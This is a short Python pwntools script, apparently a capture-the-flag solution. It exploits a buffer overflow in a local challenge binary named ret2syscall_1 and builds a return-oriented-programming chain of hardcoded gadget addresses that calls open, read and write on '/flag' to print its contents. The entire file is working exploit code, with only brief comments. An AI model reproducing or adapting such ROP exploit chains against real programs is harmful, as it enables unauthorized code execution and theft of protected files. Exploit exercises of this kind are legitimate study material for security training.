#!/usr/bin/python

from pwn import *

context(arch="amd64", os="linux")

# gadgets
flag_str_addr = 0x402008 # "/flag"
buf_addr = 0x404060 # 缓冲区.bss段

pop_rax_addr = 0x401180 # pop rax; ret
pop_rdi_addr = 0x4012b3 # pop rdi; ret
pop_rsi_addr = 0x4012b1 # pop rsi; pop r15; ret
pop_rdx_addr = 0x40117e # pop rdx; ret

syscall_addr = 0x401182 # syscall; ret

# call open('/flag', 'O_RDONLY')
# rax = 2
# call read(3, buf, 0x100)
# rax = 0
# call write(1, buf, 0x100)
# rax = 1

payload = cyclic(0x10)  # 填满缓冲区
payload += cyclic(0x8)  # saved_rbp


payload += p64(pop_rsi_addr)
payload += p64(0) # rsi = 0
payload += cyclic(8)

payload += p64(pop_rdi_addr)
payload += p64(flag_str_addr) # rdi = "/flag"

payload += p64(pop_rax_addr)
payload += p64(2) # rax = SYS_open

payload += p64(syscall_addr) # open('/flag', 'O_RDONLY')


payload += p64(pop_rdx_addr)
payload += p64(0x100) # rdx = 0x100

payload += p64(pop_rsi_addr)
payload += p64(buf_addr) # rsi = buf
payload += cyclic(8)

payload += p64(pop_rdi_addr)
payload += p64(3) # rdi = 3

payload += p64(pop_rax_addr)
payload += p64(0) # rax = SYS_read

payload += p64(syscall_addr) # read(3, buf, 0x100)


payload += p64(pop_rdx_addr)
payload += p64(0x100) # rdx = 0x100

payload += p64(pop_rsi_addr)
payload += p64(buf_addr) # rsi = buf
payload += cyclic(8)

payload += p64(pop_rdi_addr)
payload += p64(1) # rdi = 1

payload += p64(pop_rax_addr)
payload += p64(1) # rax = SYS_write

payload += p64(syscall_addr) # write(1, buf, 0x100)


sh = process("/challenge/ret2syscall_1")
# sh.sendafter(b"Give me your input\n", payload)
sh.send_raw(payload)
sh.interactive()
print(sh.recv())